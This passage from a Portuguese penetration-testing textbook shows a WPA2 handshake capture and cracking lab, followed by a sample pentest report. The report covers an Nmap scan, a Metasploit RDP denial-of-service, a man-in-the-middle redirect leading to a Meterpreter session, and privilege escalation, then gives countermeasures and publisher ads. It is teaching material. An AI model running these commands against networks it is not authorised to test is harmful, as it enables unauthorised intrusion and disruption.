ER\tAUT\tESSID\n74:EA:3A:E1:E8:66\t-3\t2\t0\t0\t11\t54e.\tWPA2\tCCMP\tPSK\tTP-LINK_E1E866\nBSSID\tSTATION\tPWR\tRate\tLost\tFrames\tProbe\n74:EA:3A:E1:E8:66\t00:23:15:73:86:6C\t-60\t0\t-54\t0\t2\nSignificado\tdos\tcampos:\n•\t\nWPA\thandshake\n\t–\tNo\tmomento\tem\tque\té\tcapturado\to\t\n4-way\thandshake\t\nde\numa\trede\tWPA/WPA2\tPSK,\to\tAirodump-ng\texibe\tna\ttela\tessa\tmensagem.\n•\t\nBSSID\n\t–\tEndereço\tMAC\tdo\troteador.\n•\t\nPWR\n\t–\tDistância\tfísica\tentre\tvocê\te\to\troteador.\tQuanto\tmenor\to\tseu\tmódulo\nmatemático,\tmais\tpróximo\tao\troteador\tvocê\testá.\tPelo\texemplo,\to\tmódulo\tdo\nPWR\tindica\t31:\tmuita\tproximidade\tfísica.\tSe\tfosse\t90,\tindicaria\tuma\ndistância\tfísica\tmuito\talta.\tCertifique-se\tde\tter\tuma\tdistância\t(no\tmáximo\taté\n70-80)\tpara\tos\ttestes\tem\trede\tsem\tfio.\tDistâncias\tfísicas\tmuito\tgrandes\npodem\tatrapalhar\ta\trealização\tdos\tlaboratórios.\n•\t\nCH\n\t–\tCanal\tde\ttransmissão\tde\tdados\tdo\troteador.\n•\t\nENC\n\t–\tEncriptação.\tWPA\tou\tWPA2\tindicam\tredes\tWPA/WPA2.\n•\t\nCIPHER\n\t–\tCifra\tcriptográfica.\tCCMP\tou\tTKIP\tsão\tas\tduas\tcifras\tque\npodemos\ttrabalhar\tpara\to\tlaboratório.\n•\t\nAUTH\n\t–\tTipo\tde\tautenticação\tusada.\tPSK\tindica\tredes\tcom\tchaves\tpré-\ncompartilhadas\tentre\tos\tusuários.\tVamos\ttrabalhar\tcom\tesse\ttipo\tde\nautenticação.\n•\t\nESSID\n\t–\tNome\tda\trede\tsem\tfio.\n•\t\nSTATION\n\t–\tEstações\tsem\tfio\t(clientes)\tconectadas\tàquele\tdeterminado\nBSSID.\nInterrompa\ta\tcaptura\tdo\tAirodump-ng\tcom\t\nCtrl+C\n.Configure\ta\tinterface\tem\tmodo\tmonitor\t\nmon0\n\tpara\to\tmesmo\tcanal\tde\tdados\tda\nrede\tsem\tfio\tem\tteste\t(no\texemplo\tcom\to\tAirodump-ng,\ta\tcoluna\t\nCH\n\testá\nmarcada\tcomo\t\n11\n).\nroot@kali#\n\tiwconfig\tmon0\tchannel\t11\nReinicie\ta\tcaptura\tdo\tAirodump-ng,\tporém\tcom\tparâmetros\tcomo\to\tcanal\t(CH\n11)\tBSSID\tda\trede\t(74:EA:3A:E1:E8:66),\te\tescreva\ta\tsaída\tno\tarquivo\nchaveWPA\n.\nroot@kali#\n\tairodump\t-c\t11\t--bssid\t74:EA:3A:E1:E8:66\t-w\tchaveWPA\tmon0\nAutentique\tqualquer\tcliente\twireless\tlegítimo\tna\trede\t(outro\tcomputador,\tum\ncelular,\ttablet,\tiPhone\tou\toutros).\nNa\tcaptura\tdo\tAirodump-ng,\tpercebe-se\tque\tfoi\tcapturado\to\t\nWPA\tHandshake\n(contém\to\t\n4-way\thandshake\n)\tao\tser\texibida\ta\tmensagem\t\nWPA\tHandshake\n.\nCH\t11\t][\tElapsed:\t0\ts\t][\t2015-03-28\t00:52\t[\t\nWPA\thandshake:\t74:EA:3A:E1:E8:66\n\t]\n\t\nBSSID\tPWR\tBeacons\t#Data,\t#/s\tCH\tMB\tENC\tCIPHER\tAUTH\tESSID\n74:EA:3A:E1:E8:66\t-31\t2\t0\t0\t11\t54e.\tWPA2\tCCMP\tPSK\tTP-LINK_E1E866\nBSSID\tSTATION\tPWR\tRate\tLost\tFrames\tProbe\n74:EA:3A:E1:E8:66\t00:23:15:73:86:6C\t-60\t0\t-54\t0\t2\nPressione\t\nCtrl+C\n\tpara\tinterromper\ta\tcaptura\tdo\tAirodump-ng.\nPara\trealizar\ta\tquebra\tda\tsenha,\tprimeiro\tcrie\tuma\tlista\tde\tpalavras\tque\tcontenha\na\tsenha\tutilizada\tna\trede\tsem\tfio.\nUtilize\to\tprograma\tAircrack-ng\tsobre\to\tarquivo\t\nchaveWPA-01.cap\n\t(arquivo\t\n.cap\nque\tcontém\to\t\n4-way\thandshake\n)\tcom\ta\topção\t\n-w\n\tpara\tutilizar\tuma\tlista\tde\npalavras.\nroot@kali#\n\taircrack-ng\tchaveWPA-01.cap\t-w\tdicionário\nAircrack-ng\t1.2\tbeta3\n[00:00:00]\t100\tkeys\ttested\t(378.00\tk/s)\nKEY\tFOUND!\t[\t\npassword\n\t]\nMaster\tKey\t:\t5D\t6E\tC2\t8B\tF2\t14\tE1\tC7\tCD\t50\t7E\t0E\t30\tC8\t09\t3A\n20\t72\tDB\tE5\t2B\tF8\tFF\t43\t33\t45\t47\t0F\tDB\t8D\t98\tCB\nTransient\tKey\t\t:\t82\t12\tEC\tDD\t48\t3C\t3B\t03\tE1\t70\tDF\tC4\t45\t90\tCF\tD0\n24\tE3\t04\t61\t39\tEB\tF6\t5F\tAB\t49\tA7\tF4\tF9\t83\tBF\t2A\nBD\t1A\t46\t15\t8B\t3E\tB3\tDC\t72\t8F\t69\t6D\tB0\t99\tFA\t7D\n21\t2C\tF1\tBB\t48\t54\t5C\t8E\t65\t32\t14\t8E\t30\t36\t26\t99\nEAPOL\tHMAC\t:\t18\t17\t43\t92\t57\t41\tB9\t20\tC2\t73\tBF\t1C\t84\tBD\tD0\t6DO\tAircrack-ng\tdecifra\ta\tsenha\tcorretamente.\n\tAPÊNDICE\nRelatório\tde\tpentest\nSumário\n1.\tSumário\texecutivo\n2.\tResultados\n3.\tNarrativa\tdo\tataque\n3.1\tVulnerabilidade\tna\trede\tsem\tfio\n3.2\tVulnerabilidades\tno\tWindows\t7\n3.2.1\tMS12_020_maxchannelids\n3.2.2\tInternet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\tRemote\tCode\nExecution\n3.2.3\tEscalonamento\tde\tprivilégios\n4.\tContramedidas\n4.1\tTP-LINK\n4.2\tWindows\t7\n5.\tSobre\to\trelatório\tfinal\n1\tSumário\texecutivo\nConforme\tdefinido\tem\tcontrato\tjudicial\testabelecido\tentre\tcontratante\te\ncontratado,\ta\tempresa\tcontratada\tDaniel\tMoreno\t–\tTreinamentos\tem\tSegurança\nda\tInformação®\tefetuará\to\tteste\tde\tintrusão\tsobre\ta\trede\tcontratante\tCliente®.\nO\tteste\tde\tintrusão\tsimulará\tum\tataque\tdigital\tà\tempresa\tCliente®\tcom\to\tintuito\nda\tanálise\te\tdo\tlevantamento\tde\tvulnerabilidades\tencontradas\tem\tsua\tmáquina\nWindows\t7\tsp0\te\tem\tsua\trede\tsem\tfio,\tapresentando\tas\trespectivas\tcorreções\ta\nserem\tadotadas;\tambas\treportadas\tneste\trelatório.\nO\tintuito\tdesse\tteste\tde\tintrusão\tserá:•\tObtenção\tda\tsenha\tda\trede\tsem\tfio.\n•\tVarredura\te\tdeterminação\tde\ttodas\tas\tpossíveis\tvulnerabilidades\tencontradas\nem\tseu\tsistema\tWindows\t7.\n•\tImpactos\tcausados\tpor\tvulnerabilidades\tem\tseu\tsistema\tWindows\t7.\n•\tAcesso\tao\tsistema\tWindows\t7.\n•\tCorreção\tpara\tas\tvulnerabilidades\tencontradas.\nTodos\tos\ttestes\tforam\tefetuados\tsobre\tcondições\tsimuladas\te\tapresentadas\tneste\nrelatório\tde\tteste\tde\tintrusão.\nPara\tesse\tteste\tde\tintrusão\tassume-se\tque:\n•\tA\trede\tsem\tfio\ttem\to\tnome\tTP_LINK_E1E866.\n•\tA\tmáquina\tWindows\t7\ttem\to\tIP\t192.168.1.101.\n•\tA\tmáquina\tauditora\ttem\to\tIP\t192.168.1.100.\nA\tempresa\tDaniel\tMoreno\t–\tTreinamentos\tem\tSegurança\tda\tInformação®\ncompromete-se\ta\tmanter\tsob\tsigilo\tabsoluto\ttoda\te\tqualquer\tinformação\nconfidencial\tque\ta\tempresa\tCliente®\tpossa\tter,\tsendo\tdetalhadamente\tdescritas\nno\tcapítulo\t3,“Narrativa\tdo\tataque”.\n2\tResultados\nSerão\tdescritos\tna\tseção\t3\t(Narrativa\tdo\tataque)\to\tteste\tde\tintrusão\trealizado\tde\nmaneira\tdetalhada\te\tas\tferramentas\tusadas;\te,\tna\tseção\t4\t(Contramedidas),\tserão\ndescritos\tos\tmétodos\tpreventivos\te\tsoluções\tpara\tas\tvulnerabilidades\tque\tforam\nencontradas.\nOs\tresultados\tforam\tpositivos\ttanto\tpara\ta\tobtenção\tda\tsenha\tda\trede\tsem\tfio,\ncomo\tpara\to\tacesso\tao\tsistema\toperacional\tWindows\t7.\nA\trede\tsem\tfio\tfoi\ttestada\tpor\tconta\tde\tuma\tvulnerabilidade\tde\tsenhas\nfragilizadas.\tA\tescolha\tde\tuma\tsenha\tfácil\tpossibilitou\ta\tquebra\tda\tsenha\nWPA2/PSK.\nNo\tWindows\t7\tforam\tencontradas\tfalhas\ttecnológicas\te\terros\tdo\tusuário\tque\npossibilitaram\ta\tentrada\tno\tsistema,\tnecessitando,\tdessa\tforma,\tde\tdesinstalação\ndos\tmódulos\tvulneráveis\te\tconscientização\tdo\tusuário.\n•\tVulnerabilidades\tno\troteador\tTP-LINK:•\tGrave:\nEscolha\tde\tsenhas\tfragilizadas.\n•\tVulnerabilidades\tno\tWindows\t7:\n•\tBaixas:\nComputador\tonline\nPortas\tabertas\nDetecção\tdo\tsistema\toperacional\n•\tGraves:\nMS12_020_maxchannelids\nInternet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\tRemote\tCode\tExecution\n3\tNarrativa\tdo\tataque\n3.1\tVulnerabilidade\tna\trede\tsem\tfio\nPrimeiro\tserá\tfeita\tuma\tauditoria\tna\trede\tsem\tfio\tpara\tdescoberta\tda\tsenha\te\nposteriores\ttestes\tde\tvulnerabilidade.\nO\tteste\té\trealizado\tcom\tauxílio\tda\tferramenta\tAirodump-ng\tque\tmostrou\tas\nseguintes\tinformações\ta\trespeito\tda\trede\tsem\tfio:\nCH\t11\t]\t[\tElapsed:\t0\ts\t]\t[\t2015-03-28\t00:52\t[\tWPA\thandshake:\t74:EA:3A:E1:E8:66\t]\nBSSID\tPWR\tBeacons\t#Data,\t#/s\tCH\tMB\tENC\tCIPHER\tAUTH\tESSID\n74:EA:3A:E1:E8:66\t-31\t2\t0\t0\t11\t54e.\tWPA2\tCCMP\tPSK\tTP-LINK_E1E866\nBSSID\tSTATION\tPWR\tRate\tLost\tFrames\tProbe\n74:EA:3A:E1:E8:66\t00:23:15:73:86:6C\t-60\t0\t-54\t0\t2\nO\tAirodump-ng\tnos\tinforma\ta\tcriptografia\tWPA2\tPSK\tda\trede\tTP-\nLINKE1E866.\nO\tAircrack-ng\trealiza\ta\tcorreta\trecuperação\tda\tsenha\tda\trede.\nAircrack-ng\t1.2\tbeta3\n[00:00:00]\t100\tkeys\ttested\t(378.00\tk/s)\nKEY\tFOUND!\t[\t\npassword\n\t]\nMaster\tKey\t:\t5D\t6E\tC2\t8B\tF2\t14\tE1\tC7\tCD\t50\t7E\t0E\t30\tC8\t09\t3A\n20\t72\tDB\tE5\t2B\tF8\tFF\t43\t33\t45\t47\t0F\tDB\t8D\t98\tCB\nTransient\tKey\t:\t82\t12\tEC\tDD\t48\t3C\t3B\t03\tE1\t70\tDF\tC4\t45\t90\tCF\tD0\n24\tE3\t04\t61\t39\tEB\tF6\t5F\tAB\t49\tA7\tF4\tF9\t83\tBF\t2ABD\t1A\t46\t15\t8B\t3E\tB3\tDC\t72\t8F\t69\t6D\tB0\t99\tFA\t7D\n21\t2C\tF1\tBB\t48\t54\t5C\t8E\t65\t32\t14\t8E\t30\t36\t26\t99\nEAPOL\tHMAC\t:\t18\t17\t43\t92\t57\t41\tB9\t20\tC2\t73\tBF\t1C\t84\tBD\tD0\t6D\nUma\tvez\tauditada\ta\trede\tsem\tfio,\ta\tauditoria\tsobre\to\tsistema\toperacional\nWindows\t7\té\tpossível,\tpois\testamos\tconectados\t(via\trede\tsem\tfio)\tà\tsua\tcorreta\nsenha.\n3.2\tVulnerabilidades\tno\tWindows\t7\nCom\tauxílio\tda\tferramenta\tNmap,\tserão\tenviados\tpacotes\tpara\ta\tmáquina\n192.168.1.103\t(máquina\tWindows\t7)\tcom\to\tintuito\tde\tdeterminar\ta\tversão\tdo\nsistema\toperacional\tutilizado,\tas\tportas\tabertas\te\ta\tversão\tdos\tserviços\trodando\nnessa\tmáquina\t(vulnerabilidades\tbaixas).\nStarting\tNmap\t6.46\t(\thttp://nmap.org\t)\tat\t2015-03-21\t15:25\tBRT\nNmap\tscan\treport\tfor\t192.168.1.101\nHost\tis\tup\t(0.00059s\tlatency).\nNot\tshown:\t986\tclosed\tports\nPORT\t\t\t\t\tSTATE\t\tSERVICE\n135/tcp\t\t\topen\t\tmsrpc\n139/tcp\t\t\topen\t\tnetbios-ssn\n445/tcp\t\t\topen\t\tmicrosoft-ds\n554/tcp\t\t\topen\t\trtsp\n1025/tcp\t\topen\t\tNFS-or-IIS\n1026/tcp\t\topen\t\tLSA-or-nterm\n1027/tcp\t\topen\t\tIIS\n1028/tcp\t\topen\t\tunknown\n1029/tcp\t\topen\t\tms-lsa\n1030/tcp\t\topen\t\tiad1\n2869/tcp\t\topen\t\ticslap\n3389/tcp\t\topen\t\tms-wbt-server\n5357/tcp\t\topen\t\twsdapi\n10243/tcp\topen\t\tunknown\nMAC\tAddress:\t08:00:27:95:9F:2A\t(Cadmus\tComputer\tSystems)\nDevice\ttype:\tgeneral\tpurpose\nRunning:\tMicrosoft\tWindows\t7|2008\nOS\tCPE:\tcpe:/o:microsoft:windows_7::-\tcpe:/o:microsoft:windows_7::sp1\ncpe:/o:microsoft:windows_server_2008::sp1\tcpe:/o:microsoft:windows_8\nOS\tdetails:\tMicrosoft\tWindows\t7\tSP0\n\t-\tSP1,\tWindows\tServer\t2008\tSP1,\tor\tWindows\t8\nNetwork\tDistance:\t1\thop\nOS\tdetection\tperformed.\tPlease\treport\tany\tincorrect\tresults\tat\thttp://nmap.org/submit/\t.\nNmap\tdone:\t1\tIP\taddress\t(1\thost\tup)\tscanned\tin\t3.97\tsecondsNmap\tdone:\t1\tIP\taddress\t(1\thost\tup)\tscanned\tin\t3.97\tseconds\nApós\tdescoberto\to\tsistema\toperacional\te\tas\tportas\tabertas,\tfoi\tutilizado\to\nscanner\tde\tvulnerabilidades\tOpenVAS,\tque\tindicou\ta\tvulnerabilidade\nMS12_020_maxchannelids\t(grave).\n3.2.1\tMS12_020_maxchannelids\nO\tserviço\tde\tacesso\tremoto\tRDP\t(Remote\tDesktop\tProtocol)\tapresenta\tuma\nvulnerabilidade\tde\tnegação\tde\tserviço,\tem\tque\ta\tmáquina\té\treinicializada\nenviando\tdeterminados\tpacotes\tmaliciosos.\nO\tmódulo\t\nauxiliary/dos/windows/rdp/ms12_020_maxchannelids\n\tda\tferramenta\nMetasploit\tfoi\tutilizado\tpara\texploração\tda\tvulnerabilidade\nms12_020_maxchannelids.\n[*]\t192.168.1.101:3389\t-\tSending\tMS12-020\tMicrosoft\tRemote\tDesktop\tUser-After-Free\tDoS\n[*]192.168.1.101:3389\t-\t210\tbytes\tsent\n192.168.1.101:3389\t-\tChecking\tRDP\tstatus...\n[+]\t192.168.1.101:3389\tseems\tdown\n[*]\tAuxiliary\tmodule\texecution\tcompleted\n3.2.2\tInternet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\tRemote\nCode\tExecution\nColetando-se\tinformações\tda\tempresa\tCliente®,\tconforme\tdeterminado\tno\nescopo\tdo\tprojeto,\tos\tfuncionários\tutilizam\to\tnavegador\tInternet\tExplorer\tpara\nacesso\tà\tinternet.\tDe\tposse\tdessa\tinformação,\té\tpossível\tutilizar\to\texploit\n“Internet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\tRemote\tCode\tExecution”\tpara\nexploração\tde\tvulnerabilidade\tnas\tmáquinas.\nTécnicas\tcomo\to\tMan-in-the-Middle\tpermitem\tque\trequisições\tDNS\tsejam\nenvenenadas\te\tredirecionadas\tpara\toutros\tendereços.\nFoi\trealizado\tum\tataque\tde\tMan-in-the-Middle\tpara\tredirecionar\ttodas\tas\nrequisições\tpara\to\tendereço\t192.168.1.100.\nCom\to\ttráfego\tredirecionado,\to\tacesso\tà\tmáquina\tWindows\t7\té\testabelecido.\n[*]\tSending\tstage\t(751104\tbytes)\tto\t192.168.1.100\n[*]\tMeterpreter\tsession\t1\topened\t(192.168.1.100:12345\t->\t192.168.1.101:49159)\tat\t2015-10-28\t13:12:50\n-0200\nmeterpreter\n\t>\n3.2.3\tEscalonamento\tde\tprivilégiosO\tescalonamento\tde\tprivilégios\tna\tmáquina\tWindows\t7\té\trealizado\tcom\to\nmódulo\t\nexploit/windows/local/bypassuac\n.\nmeterpreter\n\t>\tgetuid\nServer\tusername:\tPC\\win7\nmeterpreter\n\t>\tgetsystem\n...got\tsystem\t(via\ttechnique\t1).\nmeterpreter\n\t>\tgetuid\nServer\tusername:\t\nNT\tAUTHORITHY\\SYSTEM\nO\tescalonamento\tde\tprivilégios\té\tnecessário,\tpois,\tquando\to\tshell\tdo\tsistema\té\nfornecido\tpor\tmeio\tdo\tMeterpreter,\to\tcontrole\tdo\tWindows\t7\té\tdisponibilizado\ncom\tcertas\trestrições.\nTemos\to\tacesso\tao\tusuário\t\nnt\tauthority\\system\n\tdo\tWindows\t7,\tfinalizando\to\nobjetivo\tdo\tteste\tde\tintrusão.\n4\tContramedidas\nPara\tcada\tvulnerabilidade\tcitada\tna\tseção\t3\t(Narrativa\tdo\tataque)\tserá\taplicada\numa\tmedida\tcorretiva.\n4.1\tTP-LINK\nA\tvulnerabilidade\tde\tsenhas\tfragilizadas\tpode\tser\tcorrigida\tpor\tmeio\tda\nimplementação\tde\tuma\tpolítica\tde\tsenhas\tseguras.\n4.2\tWindows\t7\nAs\tvulnerabilidades\trelativas\tao\tWindows\tpodem\tser\tcorrigidas\tcom\ta\tadoção\ndas\tseguintes\tmedidas:\n•\tPara\tas\tvulnerabilidades\tMS12_020_maxchannelids:\n•\tDesabilite\to\tuso\tdo\tprotocolo\tRDP.\n•\tSe\tfor\tnecessária\ta\tadministração\tremota\tao\tsistema,\tpense\tem\tutilizar\noutros\tprogramas\tcomo\to\tOpenSSH.\n•\tPara\ta\tvulnerabilidade\tInternet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\nRemote\tCode\tExecution:\nUso\tde\tnavegadores\talternativos:\tChrome,\tMozzila,\tOpera.5\tSobre\to\trelatório\tfinal\nEste\trelatório\ttem\tcomo\tintuito\talertar\to\tcliente\tsobre\tas\tfalhas\te\nvulnerabilidades\tencontradas\tem\tsua(s)\trede(s)\te\tmáquina(s).\tTodas\tas\nferramentas\tusadas\tsão\tdestinadas\tao\tpúblico,\tou\tseja,\tqualquer\tpessoa\tpode\nfazer\tuso\tdas\tferramentas\tcitadas\tnesse\trelatório.\tNão\thouve\tqualquer\ttipo\tde\nferramenta\tdesenvolvida\tpara\tuso\tparticular\tou\tde\tuso\tprivado,\tcaso\ttenha,\tno\npróprio\trelatório\thá\tindicações\tde\tque\tse\ttrata\tde\tuma\tferramenta\tparticular\ndestinada\túnica\te\texclusivamente\tpara\ttestes\tde\tintrusão.\nToda\te\tqualquer\tinformação\tcontida\tna\tseção\t3\t(Narrativa\tdo\tataque)\té\tde\nconhecimento\tapenas\tdo\tcliente\te\tdo\tauditor\tde\tsegurança.\tSuas\trespectivas\ncontramedidas\tencontram-se\tna\tseção\t4\t(Contramedidas).\nAtenciosamente,\nDaniel\tMoreno.Referências\nSites:\nhttps://www.digitalocean.com/community/tutorials/how-to-use-openvas-to-audit-\nthe-security-of-remote-systems-on-ubuntu-12-04\nhttp://www.ataliba.eti.br/sections/old-hacking/unsekurity/texto1/detonaxhost.txt\nhttps://www.youtube.com/watch?v=FlRAA-1UXWQ\nhttp://serverfault.com/questions/98741/files-mounted-over-nfsv4-are-owned-by-\n4294967294-uids-and-gids-match\nhttp://blog.philippheckel.com/2013/08/04/use-sslsplit-to-transparently-sniff-tls-\nssl-connections/\nhttp://www.crisalis-project.eu/sites/crisalis-project.eu/files/crisalis_deliverable-\nD5.1.pdf\nhttps://www.youtube.com/watch?v=7bqiDj4n0ho\nhttp://www.juliobattisti.com.br/artigos/windows/tcpip_p24.asp\nhttp://pt.wikipedia.org/wiki/Traceroute\nhttp://www.rationallyparanoid.com/articles/hping.html\nhttp://www.radarhack.com/dir/papers/hping2_v1.5.pdf\nhttp://www.informabr.com.br/tcpconexao.htm\nhttp://andreysmith.wordpress.com/2011/01/02/three-way-handshake/\nhttp://www.exploit-db.com/papers/18939\nhttp://dl.packetstormsecurity.net/papers/general/netcat_password.pdf\nhttp://www.youtube.com/watch?v=J_js6zvNNAE\nhttp://www.guiafoca.org/cgs/guia/avancado/ch-fw-iptables.html\nhttp://www.vivaolinux.com.br/artigo/Tutorial-Netcat/\nhttp://www.w3schools.com/php/php_mail.asp\nhttp://www.exploit-db.com/bypassing-uac-with-user-privilege-under-windows-\nvista7-mirror/http://www.exploit-db.com/exploits/14723/\nhttp://technet.microsoft.com/en-us/security/bulletin/MS10-046\nhttp://technet.microsoft.com/en-us/security/bulletin/MS12-020\nhttp://www.rapid7.com/db/modules/exploit/windows/ftp/easyftp_cwd_fixret\nhttp://theinsider.deep-ice.com/texts/xss_exposed.txt\nhttps://www.owasp.org/index.php/Testing_for_Cross_site_scripting\nhttps://github.com/Veil-Framework/Veil-Evasion/\nhttp://www.youtube.com/watch?v=uo6J1WARf5Q\nhttp://www.offensive-security.com/penetration-testing-sample-report.pdf\nhttp://www.thoughtcrime.org/software/sslstrip\nhttp://rlworkman.net/howtos/iptables/spanish/chunkyhtml/a4189.html\nhttp://0daysecurity.com/articles/hping3_examples.html\nhttp://www.danielmiessler.com/study/tcpdump\nhttp://www.youtube.com/watch?v=D4TDhGecB9A\nLivros:\nALI,\tShakeel;\tHERIYANTO,\tTedi.\t\nBacktrack\t4:\tAssuring\tSecurity\tby\nPenetration\tTesting\n.\tBirmingham:\tPackt\tPublishing,\t2011.\nFERREIRA,\tRubem\tE.\t\nLinux:\tguia\tdo\tadministrador\tdo\tsistema\n.\t2.ed.\tSão\nPaulo:\tNovatec\tEditora,\t2003.\nGIAVAROTO,\tSílvio\tC.\tR.;\tSANTOS,\tGerson\tR.\t\nBacktrack\tLinux:\tauditoria\te\nteste\tde\tinvasão\tem\tredes\tde\tcomputadores\n.\tRio\tde\tJaneiro:\tEditora\tCiência\nModerna,\t2013.\nKENNEDY,\tDavid;\tO’GORMAN,\tJim;\tKEARNS,\tDevon;\tAHARONI,\tMati.\nMetasploit:\tThe\tPenetration\tTester’s\tGuide\n.\tSan\tFrancisco:\tNo\tStarch\tPress,\n2011.\nMCCLURE,\tStuart;\tSCAMBRAY,\tJoel;\tKURTZ,\tGeorge.\t\nHackers\tExpostos\t7:\nSegredos\te\tsoluções\tpara\ta\tsegurança\tde\tredes\n.\t7ed.\tPorto\tAlegre:\tBookman,\n2014.\nULBRICH,\tHenrique\tC.;\tVALLE,\tJames\tD.\t\nUniversidade\tHacker\n.\t2.ed.\tSão\nPaulo:\tDigerati\tBooks,\t2003.Pentest\tem\tredes\tsem\tfio\nMoreno,\tDaniel\n9788575226070\n320\tpáginas\nCompre\tagora\te\tleia\nPentest\tem\tredes\tsem\tfio\ttem\to\tintuito\tde\tcapacitar\to\tleitor\ta\tentender\ne\trealizar\to\tpentest\tem\tredes\tsem\tfio.\tComo\tcomplemento\tda\tobra\nIntrodução\tao\tpentest,\tdo\tmesmo\tautor,\teste\tlivro\té\tfocado\nexclusivamente\tem\tredes\tsem\tfio,\tmostrando\tas\tprincipais\tformas\tde\nataque\tque\tum\tindivíduo\tmal-intencionado\tpode\tutilizar\tpara\tacessar\ta\nsua\trede\tsem\tfio.\tSimulando\to\tpensamento\tde\tum\tcracker,\teste\tlivro\napresenta\tos\tpassos\te\tas\ttécnicas\tnecessárias\tpara\tse\tobter\to\tacesso\tà\nrede\tsem\tfio:\tConhecer\to\tfuncionamento\tde\tuma\trede\tsem\tfio\tna\nteoria\te\tna\tprática:\tquais\tsão\tos\tprincipais\ttipos\tde\tcriptografia\te\tcomo\nfuncionam.\tTestar\tlaboratórios\te\tambientes\tsimulados:\tvamos\nentender\tpor\tque\tos\tprincipais\tsistemas\tcriptográficos\tfalham\te\tpor\nque\té\ttão\tsimples\thackear\tuma\trede\tsem\tfio.\tRealizar\to\tmapeamento\nde\tredes\tsem\tfio\tcom\tsoftwares\tespecíficos\tpara\tessa\tfinalidade\t(GPS\nUSB)\te\tdescobrir\ta\tlocalização\tfísica\tdos\tpontos\tde\tacesso.\tSaber\ncomo\tse\tdefender\tpor\tmeio\tdos\tsoftwares\tde\tmonitoramento\te\tde\ndetecção\tde\tintruso\t(wIDS\te\twIPS).\tAprender\ta\tcriar,\tde\tforma\ndidática\te\texplicativa,\tas\tredes\tsem\tfio\tmais\tseguras\tque\texistem:\nredes\tempresariais\tcom\tcertificados\tdigitais\tautoassinados.\tCom\ttodo\nesse\tarmamento\tem\tmãos,\trealizar\tuma\tsimulação\tde\tpentest\te,\taoesse\tarmamento\tem\tmãos,\trealizar\tuma\tsimulação\tde\tpentest\te,\tao\nfinal,\taprender\tcomo\té\tfeita\ta\tescrita\tde\tum\trelatório\tde\tpentest\tpara\nredes\tsem\tfio.\tEsta\tobra\taborda\tos\ttestes\tde\tintrusão\tem\tredes\tsem\tfio\nem\tdetalhes.\tApós\ta\tleitura,\tcertamente\tas\tredes\tnunca\tmais\tserão\tas\nmesmas.\nCompre\tagora\te\tleiaGuia\tPrático\tde\tCifragem\tManual\nRibeiro,\tFred\n9788575226230\n104\tpáginas\nCompre\tagora\te\tleia\nEste\tguia\tvisa\trecuperar\ttécnicas\túteis\tque\ttêm\tsido\tesquecidas\tao\nlongo\tdo\ttempo,\tmétodos\tde\tcifragem\tque\tpodem\tser\tutilizados\tcom\num\tmínimo\tde\trecursos,\tpouco\talém\tde\tpapel\te\tcaneta.\tTambém\napresenta\tnovas\tcifras\te\tadaptações\tde\tcifras\ta\tdispositivos\tdo\tdia\ta\ndia,\tcomo\tsudoku,\tbatalha\tnaval\te\ttabuleiro\tde\txadrez.\tCom\nlinguagem\tsimples\te\trepleto\tde\texemplos,\to\tlivro\tprima\tpela\npraticidade.\tA\tcifragem\tmanual\tnão\tvisa\tsubstituir\ta\tcriptografia\ndigital,\tmas\tcomplementar,\tao\tsuprir\to\tindivíduo\tcom\ttécnicas\tque\nsejam\tempregadas\tquando\tda\tausência\tde\trecursos\tcomputacionais.\nCompre\tagora\te\tleiaAutomatize\ttarefas\tmaçantes\tcom\tPython\nSweigart,\tAl\n9788575226087\n568\tpáginas\nCompre\tagora\te\tleia\nAPRENDA\tPYTHON.\tFAÇA\tO\tQUE\tTEM\tDE\tSER\tFEITO.\tSe\tvocê\njá\tpassou\thoras\trenomeando\tarquivos\tou\tatualizando\tcentenas\tde\ncélulas\tde\tplanilhas,\tsabe\tquão\tmaçantes\tpodem\tser\tesses\ttipos\tde\ntarefa.\tQue\ttal\tse\tvocê\tpudesse\tfazer\to\tseu\tcomputador\texecutá-las\npara\tvocê?\tCom\to\tlivro\tAutomatize\ttarefas\tmaçantes\tcom\tPython,\nvocê\taprenderá\ta\tusar\to\tPython\tpara\tcriar\tprogramas\tque\tfarão\tem\nminutos\to\tque\texigiria\thoras\tpara\tser\tfeito\tmanualmente\t–\tsem\tque\nseja\tnecessário\tter\tqualquer\texperiência\tanterior\tcom\tprogramação.\nApós\tter\tdominado\to\tbásico\tsobre\tprogramação,\tvocê\tcriará\nprogramas\tPython\tque\trealizarão\tproezas\túteis\te\timpressionantes\tde\nautomação\tsem\tnenhum\tesforço:\tPesquisar\ttexto\tem\tum\tarquivo\tou\nem\tvários\tarquivos.\tCriar,\tatualizar,\tmover\te\trenomear\tarquivos\te\npastas.\tPesquisar\tna\tWeb\te\tfazer\tdownload\tde\tconteúdos\tonline.\nAtualizar\te\tformatar\tdados\tem\tplanilhas\tExcel\tde\tqualquer\ttamanho.\nSeparar,\tcombinar,\tadicionar\tmarcas-d'água\te\tcriptografar\tPDFs.\nEnviar\temails\tpara\tlembretes\te\tnotificações\ttextuais.\tPreencher\nformulários\tonline.\tInstruções\tpasso\ta\tpasso\tdescreverão\tcada\nprograma\te\tprojetos\tpráticos\tno\tfinal\tde\tcada\tcapítulo\tdesafiarão\tvocê\na\taperfeiçoar\tesses\tprogramas\te\ta\tusar\tsuas\thabilidades\trecém-a\taperfeiçoar\tesses\tprogramas\te\ta\tusar\tsuas\thabilidades\trecém-\nadquiridas\tpara\tautomatizar\ttarefas\tsemelhantes.\tNão\tgaste\tseu\ttempo\nexecutando\ttarefas\tque\tum\tmacaquinho\tbem\ttreinado\tpoderia\tfazer.\nMesmo\tque\tnão\ttenha\tjamais\tescrito\tuma\tlinha\tde\tcódigo,\tvocê\npoderá\tfazer\to\tseu\tcomputador\trealizar\to\ttrabalho\tpesado.\tSaiba\tcomo\nem\tAutomatize\ttarefas\tmaçantes\tcom\tPython.\nCompre\tagora\te\tleiaDesenvolvendo\tWebsites\tcom\tPHP\nNiederauer,\tJuliano\n9788575226179\n320\tpáginas\nCompre\tagora\te\tleia\nDesenvolvendo\tWebsites\tcom\tPHP\tapresenta\ttécnicas\tde\nprogramação\tfundamentais\tpara\to\tdesenvolvimento\tde\tsites\tdinâmicos\ne\tinterativos.\tVocê\taprenderá\ta\tdesenvolver\tsites\tcom\tuma\tlinguagem\nutilizada\tem\tmilhões\tde\tsite